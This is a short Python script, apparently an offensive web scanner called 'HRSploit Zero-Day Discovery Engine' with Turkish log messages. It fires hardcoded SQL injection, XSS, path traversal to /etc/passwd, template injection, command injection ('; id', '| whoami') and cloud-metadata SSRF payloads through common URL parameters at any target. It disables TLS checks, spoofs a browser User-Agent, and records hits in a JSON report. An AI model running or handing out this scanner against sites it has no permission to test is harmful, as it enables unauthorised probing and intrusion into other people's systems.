#!/usr/bin/env python3
"""HRSploit Zero-Day Discovery Engine"""
import sys,requests,re,time,json
from pathlib import Path
from datetime import datetime
requests.packages.urllib3.disable_warnings()

def log(t,m,c="\033[91m"): print(f"{c}[{datetime.now().strftime('%H:%M:%S')}][{t}]\033[0m {m}",flush=True); time.sleep(0.06)

PAYLOADS = [
    "' OR '1'='1","1 AND SLEEP(3)--","<script>alert(1)</script>",
    "../../../../etc/passwd","{{7*7}}","${7*7}","; id","| whoami",
    "http://127.0.0.1/","http://169.254.169.254/",
]
INDICATORS = {
    "SQLi":["sql syntax","mysql_fetch","you have an error","odbc"],
    "XSS": ["<script>alert","onerror=alert"],
    "RCE": ["uid=","root:x:","bin/bash"],
    "SSTI":["49"],
    "SSRF":["169.254","instance-id"],
    "Path":["root:x:0"],
}

def scan(target):
    sess=requests.Session(); sess.verify=False
    sess.headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0)"
    findings=[]; log("ZD",f"Hedef: {target}")
    for i,payload in enumerate(PAYLOADS,1):
        pct=int((i/len(PAYLOADS))*40); bar="x"*pct+"-"*(40-pct)
        print(f"\r  [{bar}] {i}/{len(PAYLOADS)} {payload[:35]:<35}",end="",flush=True)
        for param in ("id","q","file","cmd","url","search","page"):
            try:
                t0=time.time(); r=sess.get(target,params={param:payload},timeout=10)
                dt=time.time()-t0; body=r.text.lower()
                for vtype,inds in INDICATORS.items():
                    if any(ind in body for ind in inds):
                        print(); log("ZD-HIT",f"BULUNDU: {vtype} param={param}")
                        findings.append({"type":vtype,"param":param,"payload":payload})
                if dt>=2.5 and "SLEEP" in payload.upper():
                    print(); log("ZD-HIT",f"TIME-BASED param={param} dt={dt:.2f}s")
                    findings.append({"type":"SQLi-Time","param":param,"delay":dt})
            except: pass
            time.sleep(0.04)
    print()
    out=Path("reports"); out.mkdir(exist_ok=True)
    (out/f"zero_day_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json").write_text(
        json.dumps({"target":target,"findings":findings},indent=2))
    log("ZD",f"Toplam: {len(findings)} bulgu","\033[92m"); return findings

if __name__ == "__main__":
    target=sys.argv[1] if len(sys.argv)>1 else input("Hedef URL: ").strip()
    scan(target)
